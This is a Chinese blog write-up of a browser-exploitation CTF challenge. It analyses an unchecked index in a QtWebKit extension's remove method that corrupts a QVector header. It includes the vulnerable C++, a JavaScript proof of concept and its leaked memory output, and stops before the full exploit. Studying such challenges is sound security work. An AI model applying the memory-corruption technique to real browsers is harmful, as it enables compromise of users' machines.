<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JS Engine Exploit-qwn2own | Migraine殇</title><meta name="keywords" content="仍在学习的苦旅中"><meta name="author" content="Migraine殇"><meta name="copyright" content="Migraine殇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浏览器的PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="JS Engine Exploit-qwn2own">
<meta property="og:url" content="https://migraine-sudo.github.io/2019/12/20/qwn2own/index.html">
<meta property="og:site_name" content="Migraine殇">
<meta property="og:description" content="浏览器的PWN">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://migraine-sudo.github.io/img/MYzR3f.jpg">
<meta property="article:published_time" content="2019-12-20T11:14:04.000Z">
<meta property="article:modified_time" content="2023-08-14T03:22:39.943Z">
<meta property="article:author" content="Migraine殇">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="浏览器">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://migraine-sudo.github.io/img/MYzR3f.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://migraine-sudo.github.io/2019/12/20/qwn2own/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="32x32" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="16x16" href="/images/icons/icon-512x512.png"/><link rel="mask-icon" href="/images/icons/icon-512x512.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-14 11:22:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/MYzR3f.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Migraine殇</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">JS Engine Exploit-qwn2own</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-20T11:14:04.000Z" title="发表于 2019-12-20 19:14:04">2019-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-14T03:22:39.943Z" title="更新于 2023-08-14 11:22:39">2023-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p>题目来源:BPK CTF -  <a target="_blank" rel="noopener" href="https://github.com/migraine-sudo/PWN-/raw/master/%E5%AE%9E%E4%BE%8BPNW%E9%A2%98/3.HEAP/qwn2own.tar">qwn2own</a></p>
</div>

<div class="note primary modern"><p>阅读辅助：</p>
<p>IE相关漏洞：<a href="https://migraine-sudo.github.io/2019/12/21/Shellcode-Write/">Shellcode编写</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/">IE的UAF分析</a>-&gt; <a href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/">IE堆溢出利用</a> </p>
<p>JS Engine相关：<a href="https://migraine-sudo.github.io/2020/02/15/v8/">V8基础</a>-&gt;<a href="https://migraine-sudo.github.io/2019/12/20/qwn2own/">jscore exloit</a>&gt;<a href="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/">roll a d8</a>-&gt;<a href="https://migraine-sudo.github.io/2020/10/06/v8-Instrumentation/">对V8进行插桩</a></p>
<p>CTF相关漏洞：<a href="https://migraine-sudo.github.io/2019/11/22/how2heap1/">how2heap One</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/25/how2heap2/">how2heap Two</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/25/how2heap3/">how2heap Three</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/27/how2heap4/">how2heap Four</a></p>
</div>

<p>概述:第一次打浏览器的PWN，也是期末前最后一次Exploit。漏洞存在于JS引擎的扩展，JS引擎则是webkit自带的javascriptcore。题目的所有防护机制都是开启的，最后除了传统利用方法泄露地址，利用JIT Page写来绕过DEP是比较有意思的部分。</p>
<a id="more"></a>

<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/veZzlT.png" alt="veZzlT"> </p>
<p>运行这个程序，我们打开一个主办方写的浏览器。要求我们编写对该浏览器进行漏洞利用的js代码，并且弹出一个计算器。</p>
<p><em>Target浏览器运行效果</em></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NWBbuv.png" alt="NWBbuv"> </p>
<p>题目描述：</p>
<blockquote>
<p>The BKP Database JavasScript API allows users to store data that can be kept hidden from other users.This allows web applications to share one web context between multiple users but yet still be able to storesensitive information pertaining to each user and keep it secret from the others.</p>
<p>更多部分看官方的API文档</p>
</blockquote>
<p>这个Browser大概是出题人用QTwebkit内核写出的简易浏览器，主办方写了一个外部的扩展（JS Extension），题目描述的就是这个插件。</p>
<p>同时这个漏洞存在于插件中（如果能挖到webkit&#x2F;jscore漏洞的话还不去申请CVE？）</p>
<p>主办方还给出了API接口文档,速读一下获取这个扩展功能的全貌。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/n7wDmG.png" alt="n7wDmG"> </p>
<h2 id="0-前置知识"><a href="#0-前置知识" class="headerlink" title="0.前置知识"></a>0.前置知识</h2><p>QT WebKit <a target="_blank" rel="noopener" href="https://doc.qt.io/archives/qt-5.5/qtwebkitwidgets-index.html">https://doc.qt.io/archives/qt-5.5/qtwebkitwidgets-index.html</a></p>
<p>QT-WebKit是一个将Webkit移植到QT的一个开源项目，Javascript操作的对象都是通过C++定义，漏洞存在的于C++所写的扩展中，JS在调用扩展对象时才有可能触发这个漏洞。</p>
<p>因为笔者的C++ STL基础不够扎实，所以QT部分无法解读更多内容。（挖个坑）</p>
<p>QT5源码:<a target="_blank" rel="noopener" href="http://download.qt.io/archive/qt/5.14/">http://download.qt.io/archive/qt/5.14/</a></p>
<p>线上版 <a target="_blank" rel="noopener" href="https://code.woboq.org/qt5/qtbase/src/corelib/tools/qvector.h.html">https://code.woboq.org/qt5/qtbase/src/corelib/tools/qvector.h.html</a></p>
<p>JIT基础知识（留坑）</p>
<h2 id="1-漏洞代码"><a href="#1-漏洞代码" class="headerlink" title="1.漏洞代码"></a>1.漏洞代码</h2><p>通过访问题目提供的example.html和API文档来快速熟悉代码。当使用BKPDataBase创建数据存储，会返回一个BKInstancec对象。BKPInstance对象可以创建一个包含数组（QVector）的对象（QBJECT）BKPStore，该对象可以创建一个拥有对其存储数据的操作权。</p>
<p>程序的BKPStore对象定义</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BKPStore</span> :</span> <span class="keyword">public</span> QObject &#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BKPStore(QObject * parent = <span class="number">0</span>, <span class="keyword">const</span> QString &amp;name = <span class="number">0</span>, quint8 tp = <span class="number">0</span>, QVariant var = <span class="number">0</span>, qulonglong store_ping = <span class="number">0</span>);</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(QVariant v)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Q_INVOKABLE QVariant <span class="title">getall</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE QVariant <span class="title">get</span><span class="params">(<span class="keyword">int</span> idx)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">insert</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, QVariant var)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">append</span><span class="params">(QVariant var)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> idx)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">void</span> <span class="title">cut</span><span class="params">(<span class="keyword">int</span> beg, <span class="keyword">int</span> end)</span></span>;</span><br><span class="line">	<span class="function">Q_INVOKABLE <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    quint8 type; <span class="comment">// specifies which type to of vector</span></span><br><span class="line">                  <span class="comment">// to use</span></span><br><span class="line">    QVector&lt;QVariant&gt; varvect;</span><br><span class="line">    QVector&lt;qulonglong&gt; intvect;</span><br><span class="line">    QVector&lt;QString&gt; strvect;</span><br><span class="line">    qulonglong store_ping;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于BKPStore的remove操作没有对输入参数进行限制，使用-1参数会导致erase函数对数组结构本身造成破坏，引发一个任意地址R&#x2F;W漏洞。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BKPStore::remove</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;varvect.erase(<span class="keyword">this</span>-&gt;varvect.begin() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;intvect.erase(<span class="keyword">this</span>-&gt;intvect.begin() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;type == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;strvect.erase(<span class="keyword">this</span>-&gt;strvect.begin() + idx);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// this doesn&#x27;t happen ever</span></span><br><span class="line">        BKPException ex;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>QT中erase内联函数（&#x2F;src&#x2F;corelib&#x2F;tools&#x2F;qvector.h）定义，erase如果只有一个参数，就只会对当前值erase，而不是一个范围。</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator begin, iterator end)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> iterator <span class="title">erase</span><span class="params">(iterator pos)</span> </span>&#123; <span class="keyword">return</span> erase(pos, pos+<span class="number">1</span>); &#125;</span><br></pre></td></tr></table></figure>
<p>QT版本的erase的实现和标准的STL中基本一致，将erase范围内的数据删去，并且将aend以后的参数拷贝到前面新的空闲位置。(使用new或者memmove)</p>
<p>关键问题在于这个函数也没有对输入参数的检测，如果输入的参数为-1，那么abegin&#x3D;-1，aend&#x3D;0，erase会将原本index为0的数据，到QVector结构的前面（index&#x3D;-1）。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> QVector&lt;T&gt;::iterator QVector&lt;T&gt;::erase(iterator abegin, iterator aend)</span><br><span class="line">&#123;</span><br><span class="line">    Q_ASSERT_X(isValidIterator(abegin), <span class="string">&quot;QVector::erase&quot;</span>, <span class="string">&quot;The specified iterator argument &#x27;abegin&#x27; is invalid&quot;</span>);</span><br><span class="line">    Q_ASSERT_X(isValidIterator(aend), <span class="string">&quot;QVector::erase&quot;</span>, <span class="string">&quot;The specified iterator argument &#x27;aend&#x27; is invalid&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> itemsToErase = aend - abegin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!itemsToErase)</span><br><span class="line">        <span class="keyword">return</span> abegin;</span><br><span class="line"></span><br><span class="line">    Q_ASSERT(abegin &gt;= d-&gt;begin());</span><br><span class="line">    Q_ASSERT(aend &lt;= d-&gt;end());</span><br><span class="line">    Q_ASSERT(abegin &lt;= aend);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> itemsUntouched = abegin - d-&gt;begin();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME we could do a proper realloc, which copy constructs only needed data.</span></span><br><span class="line">    <span class="comment">// FIXME we are about to delete data - maybe it is good time to shrink?</span></span><br><span class="line">    <span class="comment">// FIXME the shrink is also an issue in removeLast, that is just a copy + reduce of this.</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;alloc) &#123;</span><br><span class="line">        detach();</span><br><span class="line">        abegin = d-&gt;begin() + itemsUntouched;</span><br><span class="line">        aend = abegin + itemsToErase;</span><br><span class="line">        <span class="keyword">if</span> (!QTypeInfoQuery&lt;T&gt;::isRelocatable) &#123;</span><br><span class="line">            iterator moveBegin = abegin + itemsToErase;</span><br><span class="line">            iterator moveEnd = d-&gt;end();</span><br><span class="line">            <span class="keyword">while</span> (moveBegin != moveEnd) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QTypeInfo&lt;T&gt;::isComplex)</span><br><span class="line">                    <span class="keyword">static_cast</span>&lt;T *&gt;(abegin)-&gt;~T();</span><br><span class="line">                <span class="keyword">new</span> (abegin++) T(*moveBegin++);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (abegin &lt; d-&gt;end()) &#123;</span><br><span class="line">                <span class="comment">// destroy rest of instances</span></span><br><span class="line">                destruct(abegin, d-&gt;end());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            destruct(abegin, aend);</span><br><span class="line">            <span class="comment">// QTBUG-53605: static_cast&lt;void *&gt; masks clang errors of the form</span></span><br><span class="line">            <span class="comment">// error: destination for this &#x27;memmove&#x27; call is a pointer to class containing a dynamic class</span></span><br><span class="line">            <span class="comment">// FIXME maybe use std::is_polymorphic (as soon as allowed) to avoid the memmove</span></span><br><span class="line">            memmove(<span class="keyword">static_cast</span>&lt;<span class="keyword">void</span> *&gt;(abegin), <span class="keyword">static_cast</span>&lt;<span class="keyword">void</span> *&gt;(aend),</span><br><span class="line">                    (d-&gt;size - itemsToErase - itemsUntouched) * <span class="keyword">sizeof</span>(T));</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;size -= <span class="keyword">int</span>(itemsToErase);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d-&gt;begin() + itemsUntouched;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>BKPStore对象操作对象QVector,定义了三个不同的QVector指针（对应不同的type，1对应int，2对应str，0对应var），如果忘了可以往上翻，重新看一下这个对象的定义。</p>
<p>QVector数据结构为QArrayData</p>
<p>头部长度24byte，offset这个值正好在array的前面。如果使用remove(-1)正好会把offset值删去，并将我们写入数组的第一个值放入offset值。（虽然实际上只能覆盖低八位，不过已经足够够了，offset值本身就用不到高8位）</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Q_CORE_EXPORT</span> <span class="title">QArrayData</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   QtPrivate::RefCount ref; <span class="comment">//4 byte 引用计数</span></span><br><span class="line">    <span class="keyword">int</span> size; <span class="comment">//4 byte 大小</span></span><br><span class="line">    uint alloc : <span class="number">31</span>; <span class="comment">// 4 byte 分配大小</span></span><br><span class="line">    uint capacityReserved : <span class="number">1</span>; <span class="comment">//4byte</span></span><br><span class="line"></span><br><span class="line">    qptrdiff offset; <span class="comment">//8 byte  // in bytes from beginning of header arry距离数组的偏移</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// array starts here</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="title">data</span><span class="params">()</span> <span class="comment">//动态</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Q_ASSERT(size == <span class="number">0</span></span><br><span class="line">                || offset &lt; <span class="number">0</span> || <span class="keyword">size_t</span>(offset) &gt;= <span class="keyword">sizeof</span>(QArrayData));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span> *&gt;(<span class="keyword">this</span>) + offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">void</span> *<span class="title">data</span><span class="params">()</span> <span class="keyword">const</span> <span class="comment">//静态</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Q_ASSERT(size == <span class="number">0</span></span><br><span class="line">                || offset &lt; <span class="number">0</span> || <span class="keyword">size_t</span>(offset) &gt;= <span class="keyword">sizeof</span>(QArrayData));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(<span class="keyword">this</span>) + offset;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>POC</strong></p>
<p>通过POC可以看到，通过remove(-1) QArryData数组的第一位0覆盖了offset，</p>
<p>然后程序将整个结构的头部打印了出来。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Poc1.html</span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">&quot;print&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	var db=BKPDataBase.create(<span class="string">&quot;dbname&quot;</span>,<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">	var A=db.createStore(<span class="string">&quot;db1&quot;</span>,<span class="number">1</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],<span class="number">0xaabb</span>);</span><br><span class="line"></span><br><span class="line">	A.remove(<span class="number">-1</span>);</span><br><span class="line">	var x=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		x+=i+<span class="string">&quot; : &quot;</span>+A.get(i).toString(<span class="number">16</span>)+<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	document.getElementById(<span class="string">&quot;print&quot;</span>).innerHTML=x;</span><br><span class="line">&lt;/script&gt;	</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/4lmO8B.png" alt="4lmO8B"> </p>
<p>头部分别是ref&#x3D;1 ，size因为remove所以减少了1</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0 : 900000001 1&lt;--ref  9 &lt;--size</span><br><span class="line">1 : 7faa0000000d </span><br><span class="line">2 : 0</span><br><span class="line">3 : 1</span><br><span class="line">4 : 2</span><br><span class="line">5 : 3</span><br><span class="line">6 : 4</span><br><span class="line">7 : 5</span><br><span class="line">8 : 6</span><br><span class="line">9 : 0 &lt;--size减少导致的不可读（9及以下都不可读）</span><br><span class="line">10 : 0</span><br><span class="line">11 : 0</span><br><span class="line">12 : 0</span><br><span class="line">13 : 0</span><br><span class="line">14 : 0</span><br></pre></td></tr></table></figure>
